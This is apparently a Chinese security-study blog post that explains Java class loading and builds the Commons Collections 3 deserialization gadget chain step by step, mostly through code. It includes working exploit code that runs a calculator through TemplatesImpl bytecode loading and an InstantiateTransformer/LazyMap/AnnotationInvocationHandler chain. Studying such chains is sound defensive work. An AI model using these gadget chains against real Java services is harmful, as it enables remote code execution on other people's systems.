---
title: CommonsCollections3
date: 2021-12-21 19:31:38
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---

# 流程图





![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640079148308-d59bddef-4973-4734-b1cd-17e56f0632d9.jpeg)



# 分析与复现

## 0x00 概述

CC3 不同于 CC1 与 CC6 最终调用 Runtime.getRuntime.exec 执行命令，而是调用 ClassLoader.loadClass 方法，动态加载类，达到任意代码执行的效果，相比之下灵活性更高。学习这一条链的主要目的就是掌握类的动态加载机制，结合反序列化进一步提高攻击的灵活性。

### 利用版本

CommonsCollections 3.1 - 3.2.1


### 限制

JDK版本：1.7 （8u71之后已修复不可利用）


## 0x01 前置知识

### 1. 类加载机制

所谓类加载，就是 JVM 虚拟机加载 .class 文件，进而能够调用里面的类。

类加载过程可以分为三个阶段分别是加载、连接、初始化。连接中可以细分为验证、准备、解析。

#### 1.1 类生命周期

类的声明周期除了类的加载外，还要加上类的使用（也就是实例化）与卸载。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639987086856-b5f1bdaa-3c43-43ce-9c99-ef04ef677838.png)

1. **加载**

- 根据路径获取二进制字节流。
- 将静态的的字节流转化为动态的运行时数据结构。
- 生成一个 Class 对象，用于提供各种访问入口。

2. **连接**

- 验证
  - 验证 Class 是否合法，不是必要步骤，可以通过 -Xverif:none 关闭，关闭后可提高运行速度。
  - **准备**为 static 成员变量分配内存空间并赋初始值。
  - 解析

3. **初始化**
4. 实例化
5. 卸载



我们知道一个类中有很多函数：构造函数、成员函数、静态代码块、构造代码块等，在 Java 中，类生命周期分为上面的 7 步，类中不同的函数和代码块的调用顺序其实不尽相同。

#### 1.2 类的初始化顺序

类的初始化顺序如下：

静态变量：用 static 声明，在准备阶段分配内存空间。

静态代码块：用staitc声明，jvm加载类时执行，仅执行一次，也是在准备阶段分配内存空间。
构造代码块：类中直接用{}定义，每一次创建对象时执行。
执行顺序优先级：静态块,main(),构造块,构造方法。

继承情况下的初始化顺序如下：

1. 执行父类的静态代码块，并初始化父类静态成员变量
2. 执行子类的静态代码块，并初始化子类静态成员变量

1. 执行父类的构造代码块，执行父类的构造函数，并初始化父类普通成员变量
2. 执行子类的构造代码块， 执行子类的构造函数，并初始化子类普通成员变量

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639986613677-d95ebc20-d9d1-47a4-a751-6e849ee042ce.png)



我们可以手动编写代码测试一下：

```java
public class Person {

    public Person() throws Exception{
        System.out.println("调用构造函数");
    }

    {
        System.out.println("调用构造代码块");
    }

    static {
        System.out.println("调用静态代码块");
    }

    public static void main(String[] args) {

    }
}

结果：
调用静态代码块
```

此时仅仅只是加载了类并且执行了 main 方法，并没有进行实例化，因此不会调用构造代码块和构造函数。

```java
public class Person {

    public Person() throws Exception{
        System.out.println("调用构造函数");
    }

    {
        System.out.println("调用构造代码块");
    }

    static {
        System.out.println("调用静态代码块");
    }

    public static void main(String[] args) throws Exception {
        Person person = new Person();
    }
}

结果：
调用静态代码块
调用构造代码块
调用构造函数
```

可以看到构造代码块是优先与构造函数执行的。

```java
public class Person {

    public Person() throws Exception{
        System.out.println("调用构造函数");
    }

    {
        System.out.println("调用构造代码块");
    }

    static {
        System.out.println("调用静态代码块");
    }

    public static void main(String[] args) throws Exception {
        Person person = new Person();
        Person person2 = new Person();
    }
}

结果：
调用静态代码块
调用构造代码块
调用构造函数
调用构造代码块
调用构造函数
```

由此可知，静态代码块只在类被加载的时候调用一次，后续的实例化并没有再次调用。



```java
public class Person {
    static String string = "静态成员变量";
    String string2 = "成员变量";
    
    public Person() throws Exception{
        System.out.println("调用构造函数");
    }

    {
        System.out.println("调用构造代码块");
    }

    static {
        System.out.println(string);
        System.out.println("调用静态代码块");
    }

    public static void main(String[] args) throws Exception {
        Person person = new Person();
    }
}
结果：
静态成员变量
调用静态代码块
调用构造代码块
调用构造函数
```

可以看到静态成员变量在静态代码块前就初始化了。

下面编写一个继承关系

```java
public class Person {
    static String string = "静态成员变量";
    String string2 = "成员变量";

    public Person() throws Exception{
        System.out.println("调用构造函数");
    }

    {
        System.out.println("调用构造代码块");
    }

    static {
        System.out.println(string);
        System.out.println("调用静态代码块");
    }

    public static void main(String[] args) throws Exception {
        Person person = new Person2();
    }
}

class Person2 extends Person{

    public Person2() throws Exception {
        System.out.println("子类调用构造函数");
    }

    {
        System.out.println("子类调用构造代码块");
    }

    static {
        System.out.println(string);
        System.out.println("子类调用静态代码块");
    }
}
结果：
静态成员变量
调用静态代码块
静态成员变量
子类调用静态代码块
调用构造代码块
调用构造函数
子类调用构造代码块
子类调用构造函数
```

静态成员变量与静态代码块在类加载的时候就初始化了，并且父类的静态变量与静态方法是优先于子类的。构造函数与构造代码块的顺序不变，也是先父类再子类。





#### 1.3 双亲委派模型（parents delegate）

Java 程序的所有类，都是使用 java.lang.ClassLoader 的一些子类加载。Java 本身提供了 3 种类加载器，这三种类加载器分别是：

1. 启动类加载器(Bootstrap ClassLoader)，C++实现，主要负责加载<JAVA_HOME>\lib目录中或被-Xbootclasspath指定的路径中的并且文件名是被虚拟机识别的文件。
2. 扩展类加载器(Extension ClassLoader)，Java 实现，主要负责加载<JAVA_HOME>\lib\ext目录中或被java.ext.dirs系统变量所指定的路径的类库。

1. 应用程序类加载器(Application ClassLoader)，Java 实现，主要负责加载用户类路径(classPath)上的类库，**如果没有实现自定义的类加载器，那么这个加载器就是运行时默认的加载器。**



双亲委派模型英文为 parents delegate ，具体结构如下图：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001547594-a103dfee-b550-4ae8-a64f-b2c0c93d68f7.webp)

在没有自定义 ClassLoader 时，默认使用 Application ClassLoader 加载用户自己写的类， Application ClassLoader 在加载某个类时，会向上询问 Extension ClassLoader 是否已经将该类加载过， Extension ClassLoader 也会向 Bootstrap ClassLoader 询问。

因此三种加载器在逻辑上是继承关系，但实际上在 Java 具体实现中三种 ClassLoader 时，关系如下图所示：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001957207-ec0338bf-f27c-456c-9a37-e51193c0cf69.jpeg)





此前反射中用到的 Class.forName 就是一种类加载的方式。

比如如下的写法：

```java
public class Test {
    public static void main(String[] args) throws ClassNotFoundException {
        Class.forName("Person");
    }
}
```

调试跟进 forName，可以发现其内部调用了 forName0 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990102545-f5f82484-1807-4522-8aeb-24a5a575d5a0.png)

可以看到 forName0 是一个 native 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990203735-a6130824-4133-4681-bd1d-726b2a0ffcc2.png)

实际上 Class.forName0 底层调用的也是 ClassLoader 进行加载。

我们可以从代码层入手更加深刻地理解 Java 是如何实现类加载的。

Test.java

```java
public class Test {
    public static void main(String[] args) throws ClassNotFoundException {
        ClassLoader cl = ClassLoader.getSystemClassLoader();
        cl.loadClass("Person");
    }
}
```

- getSystemClassLoader 函数用于获取系统的 ClassLoader。
- loadClass 加载指定的类。

下断点后开始调试。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990426529-22c704ca-b5cf-4846-b63a-530a888c1692.png)

调用另一个 loadClass。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990481447-28ac6305-1990-4b3e-9bb7-57086c60aa93.png)

调用后进入 AppClassLoader.loadClass，调用父类 ClassLoader.loadClass .

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640003227711-5f64748f-f1de-43cc-9612-aa2bb199fc9a.png)

首先调用 findLoadedClass 查找该类是否已经被加载。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990644577-b7c41f39-6c8f-4df9-8d95-da3898f27ddf.png)

此时 parent 为 ExtClassLoader 。调用 ExtClassLoader.loadClass 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000292137-9201023f-4aa6-461b-a6af-7f1a77a60027.png)

但是 ExtClassLoader 没有 loadClass 方法，因此调用父类，也就是 ClassLoader. loadClass ，就是当前的这个函数。此时 parent = null，调用 findBootstrapClassOrNull 方法，从 BootstrapClass 中寻找，也就是判断这个类是否被 BootstrapClassLoader 加载过，结果为 null。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000583258-bbcba66f-afbe-48a9-a9f3-137b2b33b08d.png)

进而调用 URLClassLoader.findClass

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000857726-76b04477-8b6f-4f9b-b139-eccd99ab6118.png)

可以看到 findClass 中首先将 class 文件的路径赋值给 path，然后调用 ucp.getResource 获取字节码为一个 Resources 对象。最后调用 defineClass 将类加载进来。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000908517-03ad879d-9baf-4f20-9d6a-00c1dda3e9ca.png)

defineClass 方法中将字节码读取出来，最终都调用重载的同名函数。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001164041-00c7984a-8af9-4fdc-a727-fed9f8f03f15.png)

该函数内部调用了 defineClass1 这个 native 函数把类加载进来。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001381415-c7b79232-0bfb-4b17-88ac-8afabb079395.png)

回顾整个调用过程，流程如下：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640003669096-e56af11a-9f8a-4d26-a192-a464215caffe.jpeg)

试想，如果我们能够控制这几个函数的任何一个，就能够加载任意的 .class 文件，攻击面就能够得到极大的扩大。

### 2. 类动态加载利用

在实际利用过程中，一般是通过动态加载恶意字节码的方式进行攻击，通常利用如下三个函数，但是这三个函数也有相应的局限：

|                          | 局限                         |                                       |
| ------------------------ | ---------------------------- | ------------------------------------- |
| URLClassLoader.loadClass | http、jar、file 等协议的局限 |                                       |
| ClassLoader.defineClass  | 方法是私有的                 | 但是可以寻找到调用其的 public 方法    |
| Usafe.defineClass        | 类不能直接生成               | Spring 中有一个 public 方法可以生成。 |

#### 2.1 URLClassLoader.loadClass

URLClassLoader 的参数为 URL 数组，可以用于加载远程的 .class 文件。

我们先编写一个示例类，编译成 .class 文件。Person 类中的 Hello 为静态函数。

```java
public class Person {
    static String string = "Hello world";
    public static void Hello(){
        System.out.println(string);
    }
}
```

将 Person.class 移动到其他目录，并在目录下使用 `python -m http.server 9999` 启一个 http 服务。

然后将项目中的 Person.java 删除。

Test.java

```java
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception{
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://localhost:9999/")});
        Class<?> c = urlClassLoader.loadClass("Person");
        Method hello = c.getMethod("Hello");
        hello.invoke(null,null);
    }
}
```

可以看到成功加载了远程的 .class 文件。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640004163397-0aca5b7a-65a9-4086-98ec-58b6bbdb2c12.png)

http 服务器上也能够收到访问请求。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640004197601-25372ebe-75cb-438c-8e0e-ed7625dca62b.png)



除了 http 协议，URLClassLoader 还可以使用 file 协议和 jar 协议。jar 协议需要我们将恶意代码先打包成一个 jar 文件。注意写法：

```java
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception{
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:http://localhost:9999/xxx.jar!/")});
        Class<?> c = urlClassLoader.loadClass("Person");
        Method hello = c.getMethod("Hello");
        hello.invoke(null,null);
    }
}
```

#### 2.2 ClassLoader.defineClass

该方法是一个 protected 方法，因此我们需要反射来调用。

```java
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Test {
    public static void main(String[] args) throws Exception{
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Path path = Paths.get("C:\\tmp\\Person.class");
        byte[] bytes = Files.readAllBytes(path);
        Class<?> c = (Class<?>) defineClass.invoke(ClassLoader.getSystemClassLoader(),"Person",bytes,0,bytes.length);
        c.getMethod("Hello").invoke(null,null);
    }
}
```

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640005855341-b2928801-8601-46e7-bb99-869a15bebe76.png)

如果我们要调用的代码写在静态代码块里，在实例化的时候就可以直接调用。

重新写一个 Person：

```java
public class Person {
    static {
        System.out.println("hello static");
    }
}
```

然后再 Test.java 中将调用方法的代码注释掉。

```java
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Test {
    public static void main(String[] args) throws Exception{
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Path path = Paths.get("C:\\tmp\\Person.class");
        byte[] bytes = Files.readAllBytes(path);
        Class<?> c = (Class<?>) defineClass.invoke(ClassLoader.getSystemClassLoader(),"Person",bytes,0,bytes.length);
        c.newInstance();
//        c.getMethod("Hello").invoke(null,null);
    }
}
```

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006204018-ee327031-ab3c-4e1d-b0e8-a7464d990ef3.png)

相比于 URLClassLoader ，ClassLoader.defineClass 只需要接收到字节码就可以调用，不需要出网，更为通用一些。

但 ClassLoader.defineClass 方法的问题在于是一个 protected 方法，因此没法直接在包外调用，反序列化时没法直接调用，但是在某些类的 public 方法中，也会调用 ClassLoader.defineClass 。使用 IDEA find Usage 查找调用，可以看到这两个包中调用了 defineClass，因此可以再这两个包中进一步寻找相关的调用链。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006513112-e610359a-55cf-4d02-b56d-e33120051623.png)



#### 2.3 Usafe.defineClass

Unsafe 类中也有一个 defineClass ，并且是 public。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006689826-dca8fdd8-6799-4a4d-ab35-1d7bb5d19774.png)

但是我们没法直接调用 defineClass 方法。因为 Unsafe 	用单例模式实现，无法直接调用构造函数生成实例，虽然有一个 getUnsafe 方法可以返回一个 Unsafe 实例，但是在运行的时候，由于安全检查，会直接抛出异常。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006845809-cb3b2ae2-c2dc-459d-9886-7ab62559a134.png)

由于 Unsafe 中会将一个实例赋值到一个静态变量 theUnsafe 中，因此我们可以通过反射来获取这个变量。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006952687-4f175023-6eba-4141-b34d-bda23213865b.png)

```java
import sun.misc.Unsafe;
import java.lang.reflect.Field;


public class Test {
    public static void main(String[] args) throws Exception{
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe u = (Unsafe) theUnsafe.get(null);
        System.out.println(u);
    }
}
```

成功获取

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640007103752-aab9ff38-5bfa-446d-b8f2-da98200007aa.png)

后面就是加载 .class ，与前面的一致。



## 0x02 触发点

我们知道利用类的动态加载，可以从 URLClassLoader.loadClass、ClassLoader.defineClass、Usafe.defineClass 这三个函数入手， CC3 这条链用的是 ClassLoader.defineClass，我们可以使用 IDEA find Usages 查找哪里调用了这个函数。当然 ClassLoader 中对 defineClass 进行了重载，都可以用 find Usages 找一找。

CC3 中使用的是下图这一个 defineClass 。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073329956-29abb27d-712d-457d-9d85-ac9b230827a4.png)



## 0x03 调用链

在 com.sun.org.apache.xalan.internal.xsltc.trax 的 TemplatesImpl 类中，有一个 defineClass 函数。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073414425-63362ca5-f410-46b4-9fde-7f8f11ffc089.png)

该函数调用了 ClassLoader.defineClass。由于是 default 类型，因此只能寻找 TemplatesImpl 中有没有 public 方法能够调用到它。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073559038-08c01e0e-cfcb-4b21-be94-a85d9e280214.png)

继续寻找，发现 defineTransletClasses 方法中有调用。但是是 private 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073814164-1e8e0259-5765-4037-8b14-1cda108f07af.png)

继续寻找，发现三个调用的地方。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073865108-c41c8c50-d5e0-47fd-a52c-f8b9f265d5d8.png)

前两个方法继续 find Usages 已经找不到了。

注意到第三个方法 getTransletInstance 中，加载了类之后，会调用 newInstance 实例化，这就可以运行恶意类中的静态代码块。但是 getTransletInstance 是一个 private 方法，需要进一步往上找。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077024321-5362ec82-cc9d-47ba-834f-99865e5d21ed.png)

最后在 newTransformer 方法中找到调用。并且 newTransformer 这个方法还是一个 public 方法，因此可以被其他类调用。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073976704-a2d5c208-9e69-41bc-bbdd-4f98ecdd5c29.png)

到了这一步，我们可以理一下调用链：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077174934-2a1a37ea-949e-4832-8616-b7170f5de6bd.png)

### 1. invokeTransformer 调用链

结合之前的 CC1 我们可以知道，invokeTransformer 可以调用任意类的任意方法，因此，只要调用 TransformerImpl.newTransformer 方法，就可以完成利用。

至此我们可以先手动编写一下 exp。

首先编写一个 Calc.java 编译成 .class 然后放到某个目录下。

```java
import java.io.IOException;

public class Calc {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

编写利用 exp 时需要注意以下几个地方：

getTransletInstance 中存在几个判断。 _name 需要不为 null，_class 需要为 null，编写 exp 时我们可以使用反射来进行修改。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075005200-5a01b13c-c327-4df7-b84a-fbf34a22b359.png)

defineTransletClasses 中，defineClass 的参数 _bytecodes 就是我们需要传入的恶意字节码，

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075120741-4dc21871-4360-4b49-bfe9-2e5043ac7d9e.png)

_bytecodes 是一个二维数组，上面在传入时是循环遍历，因此构造一个二维数组，其中就放一个元素，为恶意字节码即可。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075859827-8b8f81af-59e2-49ce-a26e-f426bd9c0a5f.png)

另外，defineTransletClasses 中有一处使用了一个 _tfactory 变量。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075992394-389edce3-ce2b-4a5f-b6d0-77a7fd57d380.png)

但是这个 _tfactory 变量是一个 transient 变量，不会被序列化。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076050015-de1514ac-f159-4b64-9d93-42ce738608b9.png)

一般这种变量，由于不能序列化，在反序列化时都会进行相应的赋值。可以查看 readObject 函数，赋值一个 TransformerFactoryImpl 实例。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076140120-1b353afc-1d6d-4c17-9edd-c5fa565defdf.png)

所以，在实际反序列化 payload 构造时，不对这个 _tfactory 赋值都是可以的，但是为了本地调试时不会报错，也需要赋值。综上可以写出如下的 exp。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class CC3 {
    public static void main(String[] args) throws Exception {
        TestCC3();
    }

    public static void TestCC3() throws Exception {
        Path path = Paths.get("C:\\tmp\\Calc.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();

    }
}
```

我们可以尝试运行一下，但是发现并不能执行且出现空指针异常，动态调试跟进去。发现在 defineTransletClasses 中的 _auxClasses 因为没有赋值而出现空指针异常。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076406058-e3258d0e-3228-4d39-b337-bda0ac2ad569.png)

此时 i = 0，_transletIndex = -1。

这里有两个解决思路，一个是给 _auxClasses 赋值，另外一个是使得表达式 superClass.getName().equals(ABSTRACT_TRANSLET 成立。

注意到下面对 _transletIndex 进行了判断，如果小于零，也会抛出 TransformerConfigurationException 异常。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076504953-c64fcccb-5f7a-44ca-88d3-015de88e1760.png)

因此，我们需要满足表达式 superClass.getName().equals(ABSTRACT_TRANSLET 成立，进而 _transletIndex 赋值为 0 ，才可以在下面这里不抛出。

ABSTRACT_TRANSLET 的值为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，所以我们编写的恶意类需要继承自这一个类。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077217556-0b003fef-9f10-48ac-b80a-9ad0cb0a5c48.png)

修改 Calc.java，注意需要实现两个 transform 方法。

```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Calc2 extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

再次运行时可以正常弹出计算器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077344524-73952bce-0e60-44ea-a94f-2c095660a157.png)

结合之前的 CC1 编写 exp：

```java
    public static void TestCC3() throws Exception {
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer();
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                templates
                        ),
                        new InvokerTransformer(
                                "newTransformer",
                                null,
                                null
                        ),
                });
        chainedTransformer.transform(new Object());
    }
```

使用 InvokerTransformer 来构造，剩下的和 CC1 一致，使用 AnnotationInvocationHandler 的 readObject 就可以了。

### 2. InstantiateTransformer 调用链

ysoserial 中使用的并不是 InvokerTransformer，而是 InstantiateTransformer。下面进一步分析 ysoserial 中的这一条利用链。

使用 find Usages 查找 newTransformer。可以发现在下面三个类中有调用，ysoserial 使用的是 TrAXFilter。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078273549-a1385780-62d7-4dda-bbad-456f68a14044.png)

可以看到调用 newTransformer 是 TrAXFilter 的构造器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078321883-bcbad6f4-aa4c-4246-a7ed-ba784f7d0809.png)

但实际上 TrAXFilter 类没有继承 Serializable 接口，不能序列化。但是在 InstantiateTransformer.transform 方法，获取传入参数的构造器，并且进行了实例化。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078451046-7541b1e6-9962-44bf-9caa-e1119c0328e5.png)

因此我们可以将 iParamTypes 赋值为 TrAXFilter 实例，在实例化时就可以调用 TrAXFilter 的构造器。

利用链如下：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078574708-d909c6e2-aeed-4199-8c92-6bf7227959e7.png)

编写对应的 exp：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception {
        TestCC3();
//        unserialize("abc.ser.bin");
    }

    public static void TestCC3() throws Exception {
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,bytes1);

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field classField = TemplatesImpl.class.getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates,null);

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

//        instantiateTransformer.transform(TrAXFilter.class);
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                TrAXFilter.class
                        ),
                        instantiateTransformer,
                });
//        chainedTransformer.transform(new Object());

        HashMap<String,String> map = new HashMap<>();
        map.put("entrySet1","aaa");

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler h1 = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);

        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), h1);

        InvocationHandler h2 = (InvocationHandler) constructor.newInstance(Target.class, proxymap);
        serialize(h2);
        unserialize("abc.ser.bin");
    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }
}

```

可以弹出计算器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078899081-b4baec9c-d6ab-4de0-9a32-ad6c311d10d4.png)

其他的也与 CC1 一样，利用 AnnotationInvocationHandler 的 readObject 就可以了。

最终利用链长这样：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640079138538-e2bf1e1a-fa18-4af3-9703-c06241340f95.png)

# 参考文章  

- [Java反序列化CommonsCollections篇(三)](https://www.bilibili.com/video/BV1Zf4y1F74K?spm_id_from=333.999.0.0)
- [Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)](https://www.bilibili.com/video/BV16h411z7o9?p=4)
- [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535) 
- [Java类加载机制和对象创建过程](https://segmentfault.com/a/1190000023876273)

- [面试官：说说双亲委派模型？](https://juejin.cn/post/6844903838927814669)
- [Java提高篇——静态代码块、构造代码块、构造函数以及Java类初始化顺序](https://www.cnblogs.com/Qian123/p/5713440.html)